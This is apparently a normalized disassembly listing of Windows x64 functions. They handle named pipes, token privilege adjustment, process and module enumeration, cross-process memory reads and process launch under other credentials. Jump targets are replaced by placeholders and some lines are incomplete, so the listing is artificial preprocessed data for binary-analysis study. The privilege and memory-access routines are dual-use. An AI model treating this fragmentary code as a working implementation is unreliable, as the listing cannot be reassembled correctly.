lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x100
mov [ rsp + 0x20 ] rbp
call [ ReadFile@IAT ]
test eax eax
setne dil
test dil dil
jne r-xdata
mov al 0x1
xor al al
jmp r-xdata
mov rcx [ rsp + 0x140 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x150 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
sub_14000ba70
push rbx
sub rsp 0x40
mov rbx [ rw-data ]
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rbx + 0x28 ] 0x8
lea rcx [ rbx + 0x10 ]
jb r-xdata
cmp rcx 0xffffffffffffffff
jne r-xdata
xor eax eax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] 0x7530
mov [ rsp + 0x28 ] eax
lea edx [ rax + 0x3 ]
lea r9d [ rax + 0x1 ]
lea r8d [ rax + 0x6 ]
mov [ rsp + 0x20 ] eax
call [ CreateNamedPipeW@IAT ]
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
mov rcx [ rcx ]
xor al al
add rsp 0x40
pop rbx
retn
cmp rax 0xffffffffffffffff
je r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
test rax rax
je r-xdata
xor edx edx
mov rcx rax
call [ ConnectNamedPipe@IAT ]
test eax eax
je r-xdata
mov rcx rax
call [ FlushFileBuffers@IAT ]
mov rcx [ rbx + 0x8 ]
call [ DisconnectNamedPipe@IAT ]
mov rcx [ rbx + 0x8 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x217
sete al
add rsp 0x40
pop rbx
retn
mov al 0x1
add rsp 0x40
pop rbx
retn
sub_14000bb30
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov rcx [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax rcx
cmp rax r8
ja r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x8
jb r-xdata
test r8 r8
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbp
lea rbp [ rcx + r8 ]
mov rcx rbx
mov rdx rbp
call sub_140002230
test al al
je r-xdata
cmp r9 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
mov rbp [ rsp + 0x30 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp r9 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rsi + rsi ]
mov rdx rdi
lea rcx [ rcx + rax * 2 ]
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rbp
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor ecx ecx
mov [ rax + rbp * 2 ] cx
sub rdi rax
mov r9 r8
mov rdx rbx
sar rdi 0x1
mov rcx rbx
mov r8 rdi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_140007240
sub_14000bc40
push rbp
push rdi
sub rsp 0x28
mov rbp rdx
mov rdi rcx
mov rdx rcx
lea r9 [ rsp + 0x50 ]
xor ecx ecx
xor r8d r8d
mov [ rsp + 0x50 ] 0x0
call [ LookupPrivilegeNameW@IAT ]
test eax eax
jne r-xdata
xor al al
add rsp 0x28
pop rdi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov ecx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] rbx
mov eax 0x2
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x20 ] r12
mov r12 0xffffffffffffffff
mul rcx
cmovo rax r12
mov rcx rax
call j_sub_14003ac60
lea r9 [ rsp + 0x50 ]
mov rdx rdi
mov r8 rax
xor ecx ecx
mov rbx rax
call [ LookupPrivilegeNameW@IAT ]
test eax eax
setne sil
test sil sil
je r-xdata
mov rcx rbx
call j_sub_14003ad04#2
mov r12 [ rsp + 0x20 ]
mov rbx [ rsp + 0x40 ]
movzx eax sil
mov rsi [ rsp + 0x48 ]
add rsp 0x28
pop rdi
pop rbp
retn
xor eax eax
mov rcx r12
mov rdi rbx
[ rdi ]
mov rdx rbx
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbp
call sub_140001ea0
sub_14000bd20
mov r11 rsp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x80
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov r13 rcx
mov [ r11 - 0x70 ] 0xffffffffffffffff
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x38 ]
mov edx 0x8
mov rcx rax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
xor al al
xor r14d r14d
mov [ rsp + 0x30 ] r14d
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
lea edx [ r14 + 0x3 ]
mov rcx [ rsp + 0x38 ]
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov ecx [ rsp + 0x30 ]
call j_sub_14003ac60
mov rsi rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x30 ]
mov r8 rsi
lea edx [ r14 + 0x3 ]
mov rcx [ rsp + 0x38 ]
call [ GetTokenInformation@IAT ]
test eax eax
setne r12b
test r12b r12b
je r-xdata
mov rcx rsi
call j_sub_14003ad04#2
movzx eax r12b
jmp r-xdata
mov edi r14d
cmp [ rsi ] r14d
jbe r-xdata
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx 0x28
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
mov rbx r14
mov [ rax + 0x18 ] 0x7
mov [ rax + 0x10 ] r14
mov [ rax ] r14w
jmp r-xdata
test rbx rbx
je r-xdata
lea r8 [ rsi + rbp * 4 + 0xc ]
mov rdx rbx
lea rcx [ rsp + 0x48 ]
call sub_14000c060
nop
mov rdx rax
mov rcx r13
call sub_140001be0
nop
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov eax edi
lea rbp [ rax + rax * 2 ]
lea rcx [ rsi + rbp * 4 + 0x4 ]
mov rdx rbx
call sub_14000bc40
test al al
je r-xdata
inc edi
cmp edi [ rsi ]
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
mov rcx rbx
call j_sub_14003ad04
mov rcx [ rbx ]
call j_sub_14003ad04
sub_14000bef0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rdi
push r12
push r13
sub rsp 0x30
mov rdx [ rcx + 0x8 ]
mov rbx 0x2aaaaaaaaaaaaaab
mov r13 rcx
sub rdx [ rcx ]
mov rax rbx
xor bpl bpl
imul rdx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ rdx + rdx * 2 ]
lea eax [ rax * 4 + 0x4 ]
movsxd rcx eax
call j_sub_14003ac60
mov rcx [ r13 + 0x8 ]
xor edi edi
sub rcx [ r13 ]
mov r12 rax
mov rax rbx
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
mov [ r12 ] edx
mov rbx [ r13 ]
cmp rbx [ r13 + 0x8 ]
je r-xdata
mov rcx r12
call j_sub_14003ad04
mov rbx [ rsp + 0x60 ]
movzx eax bpl
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
mov [ rsp + 0x58 ] rsi
lea rsi [ r12 + 0xc ]
nop [ rax ] eax
test bpl bpl
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsp + 0x58 ]
mov [ rsp + 0x50 ] 0xffffffffffffffff
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x50 ]
mov rcx rax
mov edx 0x20
call [ OpenProcessToken@IAT ]
test eax eax
setne bpl
test bpl bpl
je r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov rcx [ rsp + 0x50 ]
xor r9d r9d
mov r8 r12
xor edx edx
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x0
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
mov eax [ rbx + 0x28 ]
add rbx 0x30
add rsi 0xc
mov [ rsi - 0xc ] eax
inc edi
cmp rbx [ r13 + 0x8 ]
jne r-xdata
lea rcx [ rdi + rdi * 2 ]
lea r8 [ r12 + rcx * 4 + 0x4 ]
xor ecx ecx
call [ LookupPrivilegeValueW@IAT ]
test eax eax
setne bpl
test bpl bpl
je r-xdata
xor bpl bpl
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
cmp edi [ r12 ]
jae r-xdata
mov bpl 0x1
jmp r-xdata
sub_14000c060
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rbx r8
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdi rcx
mov [ rsp + 0x30 ] eax
mov [ rcx ] ax
call sub_140001dd0
mov r11d [ rbx ]
mov rbx [ rsp + 0x38 ]
mov [ rdi + 0x28 ] r11d
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_14000c0b0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1f0 ]
sub rsp 0x2f0
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x340 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1e0 ] rax
mov r12 rdx
mov rbx rcx
xor edx edx
lea ecx [ rdx + 0x2 ]
call [ CreateToolhelp32Snapshot@IAT ]
mov r13 rax
cmp rax 0xffffffffffffffff
je r-xdata
xor al al
mov [ rbp - 0x60 ] 0x238
lea rdx [ rbp - 0x60 ]
mov rcx rax
call [ Process32FirstW@IAT ]
test eax eax
je r-xdata
mov rcx r13
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
xor r14d r14d
mov r15 0x2e8ba2e8ba2e8ba3
mov rcx [ rbp + 0x1e0 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x340 ]
add rsp 0x2f0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax [ rbp - 0x60 ]
mov [ rsp + 0x40 ] eax
mov eax [ rbp - 0x5c ]
mov [ rsp + 0x44 ] eax
mov eax [ rbp - 0x58 ]
mov [ rsp + 0x48 ] eax
mov rax [ rbp - 0x50 ]
mov [ rsp + 0x50 ] rax
mov eax [ rbp - 0x48 ]
mov [ rsp + 0x58 ] eax
mov eax [ rbp - 0x44 ]
mov [ rsp + 0x5c ] eax
mov eax [ rbp - 0x40 ]
mov [ rsp + 0x60 ] eax
mov eax [ rbp - 0x3c ]
mov [ rsp + 0x64 ] eax
mov eax [ rbp - 0x38 ]
mov [ rsp + 0x68 ] eax
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r14
mov [ rsp + 0x70 ] r14w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x34 ]
[ rdi ]
not rcx
dec rcx
mov rsi rcx
mov rax 0x7ffffffffffffffe
cmp rcx rax
ja r-xdata
mov rcx r12
call sub_140001bd0
mov rcx rax
lea rdx [ rbp - 0x34 ]
call sub_14003bad0
test eax eax
jne r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp rcx 0x7
jbe r-xdata
lea rdx [ rbp - 0x60 ]
mov rcx r13
call [ Process32NextW@IAT ]
test eax eax
je r-xdata
test rcx rcx
jne r-xdata
xor r8d r8d
mov rdx rcx
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
jmp r-xdata
jmp r-xdata
test rsi rsi
setne al
test al al
je r-xdata
mov [ rbp - 0x80 ] r14
mov [ rsp + 0x70 ] r14w
test r12 r12
je r-xdata
mov r8 [ rbx + 0x8 ]
lea rax [ rsp + 0x40 ]
cmp rax r8
jae r-xdata
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
lea rdi [ rsi + rsi ]
mov r8 rdi
lea rdx [ rbp - 0x34 ]
call sub_14003a8c0
mov [ rbp - 0x80 ] rsi
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + rdi ] r14w
cmp r8 [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
lea rcx [ rsp + 0x40 ]
cmp rax rcx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x28 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d450
lea rcx [ rsp + 0x40 ]
sub rcx rax
mov rax r15
imul rcx
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp r8 [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x58
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov eax [ rsp + 0x40 ]
mov [ rcx ] eax
mov eax [ rsp + 0x44 ]
mov [ rcx + 0x4 ] eax
mov eax [ rsp + 0x48 ]
mov [ rcx + 0x8 ] eax
mov rax [ rsp + 0x50 ]
mov [ rcx + 0x10 ] rax
mov eax [ rsp + 0x58 ]
mov [ rcx + 0x18 ] eax
mov eax [ rsp + 0x5c ]
mov [ rcx + 0x1c ] eax
mov eax [ rsp + 0x60 ]
mov [ rcx + 0x20 ] eax
mov eax [ rsp + 0x64 ]
mov [ rcx + 0x24 ] eax
mov eax [ rsp + 0x68 ]
mov [ rcx + 0x28 ] eax
add rcx 0x30
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r14
mov [ rcx ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x70 ]
call sub_140001dd0
nop
imul rdi rdi 0x58
add rdi [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d450
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
jmp r-xdata
mov rdx rdi
call sub_14000dee0
nop
sub_14000c3b0
push rbp
push rdi
push r12
sub rsp 0x20
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] r13
mov [ rsp + 0x58 ] r14
mov r14 rcx
mov ecx 0x20
mov rbx r8
mov r13 rdx
xor r12b r12b
call sub_14003ac60
xor ebp ebp
mov rdi rax
test rax rax
je r-xdata
mov rdi rbp
mov [ rax ] rbp
mov [ rax + 0x8 ] rbp
mov [ rax + 0x10 ] rbp
jmp r-xdata
mov r14 [ rsp + 0x58 ]
mov r13 [ rsp + 0x50 ]
mov rbx [ rsp + 0x40 ]
test rdi rdi
je r-xdata
test r13 r13
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_14000c590
test al al
je r-xdata
movzx eax r12b
add rsp 0x20
pop r12
pop rdi
pop rbp
retn
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
mov rdx [ rdi ]
mov rcx r14
call sub_14000c4d0
mov r12b 0x1
jmp r-xdata
mov rcx rdi
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
call j_sub_14003ad04
mov rdx [ rdi + 0x8 ]
call sub_14000de60
mov rcx [ rdi ]
call j_sub_14003ad04
mov [ rsp + 0x48 ] rsi
nop [ rax + rax ] ax
lea rsi [ rbx + 0x30 ]
mov rsi [ rbx + 0x30 ]
jmp r-xdata
mov rdx rbx
mov rcx r14
call sub_14000c4d0
mov r12b 0x1
sub rbx 0xffffffffffffff80
cmp rbx [ rdi + 0x8 ]
jne r-xdata
mov rcx r13
call sub_140001bd0
mov rcx rsi
mov rdx rax
call sub_14003bad0
test eax eax
je r-xdata
cmp [ rbx + 0x48 ] 0x8
jb r-xdata
jmp r-xdata
mov rsi [ rsp + 0x48 ]
sub_14000c4d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov eax [ rdx ]
mov rbx rdx
mov rdi rcx
mov [ rcx ] eax
mov eax [ rdx + 0x4 ]
add rcx 0x30
mov [ rcx - 0x2c ] eax
mov eax [ rdx + 0x8 ]
add rdx 0x30
mov [ rcx - 0x28 ] eax
mov eax [ rdx - 0x24 ]
or r9 0xffffffffffffffff
mov [ rcx - 0x24 ] eax
mov eax [ rdx - 0x20 ]
xor r8d r8d
mov [ rcx - 0x20 ] eax
mov rax [ rdx - 0x18 ]
mov [ rcx - 0x18 ] rax
mov eax [ rdx - 0x10 ]
mov [ rcx - 0x10 ] eax
mov rax [ rdx - 0x8 ]
mov [ rcx - 0x8 ] rax
call sub_140001dd0
lea rdx [ rbx + 0x58 ]
lea rcx [ rdi + 0x58 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_14000c550
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov rcx rbx
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
call j_sub_14003ad04
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rdx [ rbx + 0x8 ]
call sub_14000de60
mov rcx [ rbx ]
call j_sub_14003ad04
sub_14000c590
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rax - 0x438 ]
sub rsp 0x510
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x400 ] rax
mov rbx rcx
xor r13d r13d
test rdx rdx
je r-xdata
mov edx r13d
mov edx [ rdx ]
jmp r-xdata
xor al al
mov [ rbp - 0x40 ] 0x438
lea rdx [ rbp - 0x40 ]
mov rcx rax
call [ Module32FirstW@IAT ]
test eax eax
je r-xdata
mov ecx 0x18
call [ CreateToolhelp32Snapshot@IAT ]
mov r12 rax
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx r12
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
mov r14 0x7ffffffffffffffe
nop [ rax + rax ] eax
mov rcx [ rbp + 0x400 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x510 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
lea rcx [ r--data ]
call sub_1400378ec
cmp rcx 0x7
jbe r-xdata
test rcx rcx
jne r-xdata
xor r8d r8d
mov rdx rcx
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
jmp r-xdata
test rsi rsi
setne al
test al al
je r-xdata
mov [ rbp - 0x80 ] r13
mov [ rsp + 0x70 ] r13w
mov [ rbp - 0x50 ] 0x7
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x68 ] r13w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x1f0 ]
[ rdi ]
not rcx
dec rcx
mov rsi rcx
cmp rcx r14
ja r-xdata
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
lea rdi [ rsi + rsi ]
mov r8 rdi
lea rdx [ rbp - 0x10 ]
call sub_14003a8c0
mov [ rbp - 0x80 ] rsi
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + rdi ] r13w
lea rcx [ r--data ]
call sub_1400378ec
cmp rcx 0x7
jbe r-xdata
test rcx rcx
jne r-xdata
xor r8d r8d
mov rdx rcx
lea rcx [ rbp - 0x68 ]
call sub_1400025a0
jmp r-xdata
test rsi rsi
setne al
test al al
je r-xdata
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x68 ] r13w
mov rax [ rbx + 0x8 ]
lea rcx [ rsp + 0x40 ]
cmp rcx rax
jae r-xdata
lea rcx [ rbp - 0x68 ]
cmp [ rbp - 0x50 ] 0x8
cmovae rcx [ rbp - 0x68 ]
lea rdi [ rsi + rsi ]
mov r8 rdi
lea rdx [ rbp + 0x1f0 ]
call sub_14003a8c0
mov [ rbp - 0x58 ] rsi
lea rax [ rbp - 0x68 ]
cmp [ rbp - 0x50 ] 0x8
cmovae rax [ rbp - 0x68 ]
mov [ rdi + rax ] r13w
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx [ rbx ]
lea rdx [ rsp + 0x40 ]
cmp rcx rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x28 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d5a0
lea rdi [ rsp + 0x40 ]
sub rdi rcx
cmp rax [ rbx + 0x10 ]
jne r-xdata
sub [ rbx + 0x8 ] 0xffffffffffffff80
cmp [ rbp - 0x50 ] 0x8
jb r-xdata
lea rdx [ rsp + 0x40 ]
call sub_14000df50
nop
and rdi 0xffffffffffffff80
add rdi [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000d5a0
mov [ rbp - 0x50 ] 0x7
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x68 ] r13w
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x68 ]
call j_sub_14003ad04
jmp r-xdata
mov rdx rdi
call sub_14000df50
nop
lea rdx [ rbp - 0x40 ]
mov rcx r12
call [ Module32NextW@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
jmp r-xdata
mov eax [ rbp - 0x40 ]
mov [ rsp + 0x40 ] eax
mov eax [ rbp - 0x3c ]
mov [ rsp + 0x44 ] eax
mov eax [ rbp - 0x38 ]
mov [ rsp + 0x48 ] eax
mov eax [ rbp - 0x34 ]
mov [ rsp + 0x4c ] eax
mov eax [ rbp - 0x30 ]
mov [ rsp + 0x50 ] eax
mov rax [ rbp - 0x28 ]
mov [ rsp + 0x58 ] rax
mov eax [ rbp - 0x20 ]
mov [ rsp + 0x60 ] eax
mov rax [ rbp - 0x18 ]
mov [ rsp + 0x68 ] rax
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r13
mov [ rsp + 0x70 ] r13w
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x10 ]
[ rdi ]
not rcx
dec rcx
mov rsi rcx
cmp rcx r14
ja r-xdata
sub_14000c8c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0xd0
xor eax eax
movzx ebp r8b
mov rdi rcx
mov [ rdx ] rax
mov [ rdx + 0x8 ] rax
mov rsi rdx
mov [ rdx + 0x10 ] rax
lea r8d [ rax + 0x68 ]
lea rcx [ rsp + 0x60 ]
xor edx edx
movzx r13d r9b
call sub_14003d760
mov rcx [ rdi + 0x10 ]
lea r12 [ rdi + 0x10 ]
inc rcx
mov eax 0x2
mov [ rsp + 0x60 ] 0x68
mul rcx
mov rcx 0xffffffffffffffff
cmovo rax rcx
mov rcx rax
call j_sub_14003ac60
mov rdx [ r12 ]
cmp rdx rdx
mov r9 rdx
mov rbx rax
cmovb r9 rdx
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov r8 rdi
mov rcx rax
call sub_14003bb58
mov r11 [ r12 ]
xor edx edx
neg bpl
lea rcx [ rsp + 0x60 ]
mov [ rbx + r11 * 2 ] dx
sbb eax eax
and eax 0x4
or eax 0x10
test r13b r13b
je r-xdata
mov rdi [ rdi ]
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x30 ] rdx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] edx
mov rdx rbx
xor r9d r9d
xor r8d r8d
xor ecx ecx
call [ CreateProcessW@IAT ]
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x48 ] rcx
mov [ rsp + 0x40 ] rdx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x30 ] eax
lea r9d [ rdx + 0x2 ]
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] rdx
lea r8 [ r--data ]
lea rdx [ r--data ]
lea rcx [ r--data ]
call [ CreateProcessWithLogonW@IAT ]
jmp r-xdata
test eax eax
mov rcx rbx
setne dil
call j_sub_14003ad04#2
lea r11 [ rsp + 0xd0 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
movzx eax dil
mov rsp r11
pop r13
pop r12
pop rdi
retn
sub_14000ca20
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rbx rdx
mov rdi rcx
cmp rdx 0xffffffffffffffff
jne r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
call [ GetCurrentProcess@IAT ]
mov rbx rax
xor al al
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
lea rcx [ rsp + 0x48 ]
mov r9d 0x30
mov r8 rdi
mov [ rsp + 0x20 ] rcx
mov rcx rbx
xor edx edx
call rax
test eax eax
jne r-xdata
cmp [ rsp + 0x48 ] 0x30
jne r-xdata
mov al 0x1
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
sub_14000caa0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov ecx 0x30
mov rsi rdx
xor dil dil
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x28 ] rax
jmp r-xdata
mov rcx rbx
call j_sub_14003ad04
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
movzx eax dil
add rsp 0x30
pop rdi
retn
mov rdx [ rbx + 0x8 ]
mov r9d 0x240
cmp rsi 0xffffffffffffffff
jne r-xdata
mov rdx rsi
mov rcx rbx
call sub_14000ca20
test al al
je r-xdata
lea rax [ rsp + 0x50 ]
mov r8 rbp
mov rcx rsi
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x50 ] 0x0
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 rdx
mov rcx rbp
mov edx r9d
call sub_14003b740
test eax eax
sete dil
jmp r-xdata
xor dil dil
cmp [ rsp + 0x50 ] 0x240
jne r-xdata
mov dil 0x1
jmp r-xdata
sub_14000cb80
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x20 ]
sub rsp 0x120
mov [ rbp - 0x70 ] 0xfffffffffffffffe
mov [ rsp + 0x178 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x10 ] rax
mov rdi r8
mov [ rsp + 0x48 ] r8
mov [ rsp + 0x68 ] rdx
mov r14 rcx
xor r13b r13b
mov ecx 0x40
call j_sub_14003ac60
mov rsi rax
mov [ rsp + 0x58 ] rax
xor eax eax
lea r9d [ rax + 0x40 ]
cmp rdi 0xffffffffffffffff
jne r-xdata
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rax
mov r8 rsi
mov rdx r14
mov rcx rdi
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 r14
mov edx r9d
mov rcx rsi
call sub_14003b740
test eax eax
sete al
test al al
je r-xdata
mov rcx rsi
call j_sub_14003ad04#2
movzx eax r13b
mov rcx [ rbp + 0x10 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x178 ]
add rsp 0x120
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rsp + 0x38 ] 0x40
jne r-xdata
jmp r-xdata
mov edx 0x40
mov rcx rsi
